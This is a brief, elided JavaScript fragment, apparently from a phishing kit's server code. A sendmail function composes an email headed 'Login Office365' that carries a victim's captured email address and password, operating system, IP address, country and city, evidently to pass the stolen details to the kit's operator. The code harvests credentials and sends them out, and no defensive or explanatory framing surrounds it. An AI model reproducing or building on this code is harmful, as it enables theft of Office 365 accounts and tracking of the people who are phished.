...
function sendmail(req,res){
 ...
 var mailOptions = {
  ...
  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>OS: ${os}<br>IP: ${info_location["ip"]}<br>Country: ${info_location["country"]}<br>City: ${info_location["city"]}</p>`
 };
